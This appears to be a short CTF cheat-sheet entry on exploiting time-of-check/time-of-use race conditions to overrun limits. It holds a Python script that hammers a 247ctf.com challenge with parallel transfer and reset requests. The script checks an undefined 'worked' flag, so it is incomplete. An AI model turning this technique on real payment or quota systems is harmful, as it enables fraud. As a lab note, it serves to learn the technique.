## TOCTOU / Limit Overrun
In case of a gap between check and update, bypassing limitations
In case of a gap between check and update.
Will work in expensive operations such as DB updates.
You can call the operation, make it pass the check but perform another operation between the "check" and the "update", bypassing limitations.
## Exploitation
The easiest way to do it in python is using threads.
Place each action you want to perform in a function then create a thread for each action.
Then start all threads in the order you want.
Repeat in a loop until it works.
Sample Code:
```python
import requests, threading

def p1():
    requests.get("https://2d85e1695fe6e8ae.247ctf.com/?to=2&from=1&amount=247")
def p2():
    requests.get("https://2d85e1695fe6e8ae.247ctf.com/?reset")
def p3():
    requests.get("https://2d85e1695fe6e8ae.247ctf.com/?to=1&from=2&amount=247")

while True:
    t1 = threading.Thread(target=p1)
    t2 = threading.Thread(target=p2)
    t3 = threading.Thread(target=p3)
    t1.start()
    t2.start()
    t3.start()
    if worked:
	    break
```